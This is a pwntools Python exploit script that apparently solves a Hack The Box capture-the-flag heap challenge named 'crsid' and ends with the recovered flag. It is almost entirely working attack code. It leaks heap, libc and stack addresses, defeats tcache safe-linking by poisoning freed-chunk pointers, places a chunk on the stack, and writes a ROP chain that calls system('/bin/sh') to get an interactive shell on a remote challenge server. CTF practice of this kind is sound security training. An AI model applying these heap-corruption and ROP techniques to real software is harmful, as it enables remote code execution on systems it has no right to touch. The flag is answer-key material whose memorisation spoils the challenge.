#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+1100+0', '-e']
#context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'info'

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]
#onegadgets = one_gadget('libc.so.6')

exe = ELF('./crsid')
libc = ELF('./glibc/libc.so.6')
#rop = ROP(exe)

host, port = "178.62.122.9", "32119"

if args.REMOTE:
  p = remote(host,port)
else:
  if args.GDB:
    p = gdb.debug([exe.path], gdbscript = '''
    source ~/gdb.plugins/gef/gef.py
    gef config context.show_opcodes_size 9
    gef config context.libc_args True
    gef config context.libc_args_path  ~/gdb.plugins/gef-extras/glibc-function-args/
#    set debug-file-directory ~/gdb.plugins/glibc-all-in-one/libs/2.32-0ubuntu3_amd64/.debug
    memory watch $_base()+0x4060 16 qword
    pie breakpoint 0x19bb
    c
     ''')
  else:
    p = process(exe.path)

def create():
  p.sendlineafter('[#] ', '1')

def edit(idx,name):
  p.sendlineafter('[#] ', '3')
  p.sendlineafter('index: ', str(idx))
  p.sendafter('Username: ', name)

def delete(idx):
  p.sendlineafter('[#] ', '2')
  p.sendlineafter('index: ', str(idx))

def show(idx):
  p.sendlineafter('[#] ', '4')
  p.sendlineafter('index: ', str(idx))

def changeCRS(id):
  p.sendlineafter('[#] ', '5')
  p.sendafter('CRSid: ', id)

p.sendafter('CRSid: ', '\x00'*32)

# create one chunk and delete it to get the (heap>>12) address (the first chunk freed is not xored)
create()
delete(0)
create()
edit(0,'A')
show(0)

p.recvuntil('Username: ', drop=True)
leak = (u64(p.recvuntil('\n', drop=True).ljust(8,'\x00')) & 0xffffffffffffff00)<<12
print('leak = '+hex(leak))

# create two more (the second will be a full heap address xored with (heap>>12)
create()
create()
delete(1)
delete(2)
create()                # this one is created on a full heap address
edit(1,'A')
show(1)

p.recvuntil('Username: ', drop=True)
heap_base = ((u64(p.recvuntil('\n', drop=True).ljust(8,'\x00')) & 0xffffffffffffff00) ^ (leak>>12)) & 0xfffffffffffff000
print('heap base = '+hex(heap_base))

delete(1)
delete(0)

for i in range(10):
  create()

for i in range(7):
  delete(i)

delete(8)
# put a libc address on heap
p.sendlineafter('[#] ', '0'*5000+'4')
p.sendlineafter('index: ', '9')

for i in range(8):
  create()

edit(8,'\x01')
show(8)
p.recvuntil('Username: ', drop=True)
libc.address = u64(p.recvuntil('\n', drop=True).ljust(8,'\x00')) - 0x1ecd01
print('libc base = '+hex(libc.address))

create()
create()

create()
# make CRS pointing to heap tcache head struct
changeCRS(p64(heap_base+0xa0))
delete(0)
# change next chunk address to points to libc.environ to leak stack address
edit(12,p64(0)+p64(libc.symbols['environ'] - 0x10))
create()
edit(0,'A'*0x10)

# leak stack address
show(0)
p.recvuntil('A'*0x10, drop=True)
environ = u64(p.recvuntil('\n', drop=True).ljust(8,'\x00'))
print('stack environ = '+hex(environ))

# delete another chunk
delete(1)
# change next chunk address to points to environ
edit(12,p64(0)+p64(environ-0x148))
# allocate chunk on stack
create()  # index 1

rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

payload = p64(0)+p64(pop_rdi) + p64(next(libc.search('/bin/sh'))) + p64(libc.symbols['system'])
edit(1, payload)

p.sendlineafter('[#] ', '8')

p.interactive()
# flag: HTB{L1bC-2.34,S4f3_l1nKinG_4nD_O0B-g0_brrr} 
